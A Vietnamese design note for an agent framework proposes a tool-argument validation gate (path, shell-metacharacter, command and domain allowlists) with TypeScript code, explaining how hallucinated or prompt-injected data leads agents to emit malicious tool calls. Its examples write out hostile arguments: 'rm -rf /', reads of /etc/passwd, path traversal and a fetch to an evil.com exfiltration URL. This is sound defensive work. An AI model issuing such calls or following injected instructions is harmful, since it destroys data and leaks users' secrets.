# Hướng IZ: Tool-Argument Injection — validate tham số tool chống hallucinate/inject

> **Nguồn gốc:** OWASP LLM06 Excessive Agency; "LLM Agent Security: Tool Call Injection"; Greshake et al. indirect injection (2022); "Hallucinated tool parameters" research; MCP tool schema validation
> **Coupling:** 🟡 — chạm tool runtime + schema validation
> **Agent-agnostic:** ✅
> **Code sẵn:** ⚠️ (tool schema + Zod validation sẵn — thiếu path/shell injection guard)
> **Effort:** 2-3 tuần

## Nguồn gốc

Tool-arg injection: LLM **hallucinate hoặc bị inject** tham số tool độc — `shell("rm -rf /")`, `read("/etc/passwd")`, `fetch("http://evil.com/exfil")`. OWASP LLM06 "Excessive Agency": agent thực hiện hành động ngoài ý do tham số sai. Greshake (2022) indirect injection: data độc nhồi vào → LLM sinh tool call với tham số độc. Nguy cơ: (1) **hallucination** — model tự bịa path/arg sai; (2) **injection** — untrusted data thao túng tham số; (3) **path traversal** — `../../etc/passwd`; (4) **shell metacharacter** — `; rm -rf`. Phòng thủ: **validate mỗi tham số** (Zod schema + path allowlist + shell escape), **deny by default** (chỉ cho phép whitelisted values).

## Mô tả

mya tool-arg validation: mỗi tool call đi qua **validation gate** trước khi execute — (1) schema (Zod: type, enum, range), (2) path (within workspace, no traversal), (3) shell (no metacharacter, command allowlist), (4) network (domain allowlist). Fail → block + audit (198). Nối IY (259) prompt-hardening: hardened prompt giảm hallucinate, IZ chặn nếu vẫn slip. Nối GR (200) injection defense + HR (226) approval gate: high-risk arg (delete, shell) → preview + approve.

## Kiến trúc

```
  LLM output: tool_call("shell", { cmd: "ls; rm -rf /tmp" })
        │
        ▼
  ┌──────────────────────────────────────────────────────┐
  │  TOOL-ARG VALIDATION GATE                             │
  │  1. SCHEMA (Zod): cmd string ✓, type match ✓         │
  │  2. PATH: "../../../etc/passwd" → BLOCK (traversal)  │
  │  3. SHELL: "ls; rm -rf" → BLOCK (metachar ;)         │
  │     allowlist: [ls, cat, grep]                       │
  │  4. NETWORK: fetch("evil.com") → BLOCK (domain deny) │
  └──────────────────┬───────────────────────────────────┘
                     │ pass all
        ┌────────────┴────────────┐
        ▼                         ▼
  ┌───────────┐          ┌──────────────────┐
  │ RISK LOW  │          │ RISK HIGH (rm/sh)│
  │ execute   │          │ → preview (IS 253)│
  │           │          │ → approve (HR 226)│
  └───────────┘          └──────────────────┘
   fail → BLOCK + AUDIT (198) + ALERT (227)
```

```
mya: Zod tool schema sẵn — thiếu: path traversal guard + shell metachar filter + domain allowlist
```

## mya ĐÃ CÓ (1 phần)

```typescript
// ✅ tool schema (Zod) — type validation (sẵn)
// ✅ GR (200) injection-defense — input layer (sẵn)
// ✅ HR (226) approval-gates — high-risk gate (documented)
// ✅ 198 audit-trails — log (sẵn)
// ✅ permission scope (GGGG) — least privilege (sẵn)

// ❌ THIẾU: path traversal validation (workspace-bound check)
// ❌ THIẾU: shell metacharacter filter (command allowlist)
// ❌ THIẾU: network domain allowlist (block exfil)
// ❌ THIẾU: deny-by-default arg policy
```

## Implementation

```typescript
// packages/tools/src/arg-guard.ts (NEW)
import { resolve, relative } from "node:path";
import { z } from "zod";

export class ToolArgGuard {
  constructor(
    private workspaceRoot: string,
    private shellAllowlist: string[] = ["ls", "cat", "grep", "git"],
    private domainAllowlist: string[] = [],
  ) {}

  validate(toolName: string, args: unknown): { ok: true } | { ok: false; reason: string } {
    // 1. Path: must be within workspace (no traversal)
    for (const val of Object.values(args as Record<string, unknown>)) {
      if (typeof val === "string" && looksLikePath(val)) {
        const rel = relative(this.workspaceRoot, resolve(this.workspaceRoot, val));
        if (rel.startsWith("..")) return { ok: false, reason: `path traversal: ${val}` };
      }
    }
    // 2. Shell: command must be in allowlist, no metacharacters
    if (toolName === "shell" && typeof (args as { cmd?: string }).cmd === "string") {
      const cmd = (args as { cmd: string }).cmd;
      if (/[;&|`$()<>]/.test(cmd)) return { ok: false, reason: "shell metacharacter blocked" };
      const base = cmd.split(/\s+/)[0]!;
      if (!this.shellAllowlist.includes(base)) return { ok: false, reason: `cmd not allowlisted: ${base}` };
    }
    // 3. Network: domain must be allowlisted
    if (toolName === "fetch" && typeof (args as { url?: string }).url === "string") {
      const host = new URL((args as { url: string }).url).host;
      if (!this.domainAllowlist.includes(host)) return { ok: false, reason: `domain blocked: ${host}` };
    }
    return { ok: true };
  }
}

// Usage: wrap every tool.run
async function guardedRun(tool: Tool, args: unknown) {
  const v = guard.validate(tool.meta.name, args);
  if (!v.ok) { await audit("arg-blocked", { tool: tool.meta.name, reason: v.reason }); return blocked; }
  return tool.run(args);
}
```

## Được / Mất

| Được | Mất |
|---|---|
| ✅ Chặn hallucinated/injected arg (OWASP LLM06) | ❌ False positive (legit path with ..) |
| ✅ Path traversal block (`../../etc/passwd`) | ❌ Allowlist maintenance burden |
| ✅ Shell injection block (`; rm -rf`) | ❌ Domain allowlist too tight → break fetch |
| ✅ Deny-by-default (whitelist) — fail safe | ❌ Overhead per tool call |

## Khác các hướng gần

| | GR (200) Injection Def | HR (226) Approval Gate | IZ: Tool-Arg Injection |
|---|---|---|---|
| Mục | Sanitize LLM input | Gate trước action | **Validate tool tham số** |
| Layer | Input | Action | **Tool call arg** |
| Path | ❌ | ❌ | ✅ traversal block |

## Khi nào chọn

- Agent có tool exec/shell/file/network (high attack surface)
- LLM hay hallucinate tham số (đường dẫn lẫn)
- Untrusted data có thể inject arg (Greshake 2022)
- Nối GR (200) + HR (226) + IY (259) hardening — defense-in-depth
